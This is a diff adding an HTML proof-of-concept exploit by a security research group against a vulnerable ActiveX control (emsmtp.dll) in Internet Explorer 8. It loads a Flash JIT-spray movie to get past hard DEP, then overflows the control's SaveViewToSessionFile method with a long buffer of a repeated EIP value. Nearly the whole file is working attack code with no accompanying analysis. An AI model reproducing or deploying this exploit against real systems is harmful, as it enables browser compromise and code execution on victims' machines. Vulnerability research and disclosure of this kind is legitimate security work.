@@ -1,0 +1,52 @@
+<HTML>
+	<HEAD>
+	<TITLE>"DSecRG": ActiveX IE8-hard-DEP Sploit [ActionScript JitSpray]</TITLE>
+	</HEAD>
+	<BODY>
+
+	<OBJECT id='vuln' classid='clsid:AFBBE070-7340-11D2-AA6B-00E02924C34E'></OBJECT>
+	<OBJECT id='spray' classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="780" height="420"></OBJECT>
+	<!--
+		Simple JIT PoC
+
+	vuln 	- emsmtp.dll v6.0.1 - vuln. ActiveX
+	spray	- Flash10 ))
+
+	by Alexey Sintsov
+		dookie@inbox.ru
+		a.sintsov@dsec.ru
+	
+	DSecRG - Digital Security Research Group [dsecrg.com]
+	
+		Original vuln. found by
+			Will Dormann 
+
+	-->
+	<SCRIPT>
+    
+
+	
+	function Exploit(){
+	
+	
+		var eip=unescape("%01%01%11%11"); 
+		var buf="";	
+		while (buf.length<12500) buf=buf+eip; 
+		
+		alert('Try me?');
+		vuln.SaveViewToSessionFile(buf);
+		
+		
+		
+	}
+
+		
+	spray.Movie="jit-spray.swf";
+	
+	setTimeout('Exploit()',10000);
+      	
+	 
+	
+	</SCRIPT>
+</BODY>
+</HTML>
